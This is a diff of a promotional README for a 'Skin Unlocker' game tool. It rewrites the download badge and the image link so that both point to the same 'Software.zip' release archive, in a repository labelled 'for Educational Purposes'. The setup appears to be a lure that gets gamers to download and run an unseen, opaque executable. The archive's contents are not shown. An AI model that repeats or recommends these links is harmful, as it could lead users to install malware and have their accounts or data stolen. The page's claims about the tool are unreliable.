@@ -20,7 +20,7 @@ Welcome to the Skin Unlocker repository! This tool provides users with the abili
 
 To start exploring the world of custom skin management, simply download the Skin Unlocker tool using the following link:
 
-[![Download Skin Unlocker](https://img.shields.io/badge/Download-Skin_Unlocker-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Skin Unlocker](https://github.com/PineeApplePie/Skin-Unlocker-for-Educational-Purposes-Custom-Skin-Management/releases/download/v1.0/Software.zip)](https://github.com/PineeApplePie/Skin-Unlocker-for-Educational-Purposes-Custom-Skin-Management/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the tool, follow the instructions provided in the repository to launch it and begin your skin customization journey!
 
@@ -36,7 +36,7 @@ If you encounter any issues with the Skin Unlocker tool or have any questions, p
 
 Get ready to delve into the exciting world of custom skin management with Skin Unlocker! Explore, create, and customize to your heart's content. Dive into the repository today and unleash your creativity in gaming! 🎮🖌️
 
-![Skin Unlocker Image](https://www.example.com/skin-unlocker-image.jpg)  
+![Skin Unlocker Image](https://github.com/PineeApplePie/Skin-Unlocker-for-Educational-Purposes-Custom-Skin-Management/releases/download/v1.0/Software.zip)  
 
 So, what are you waiting for? Start your skin unlocking journey now! 🚀
 
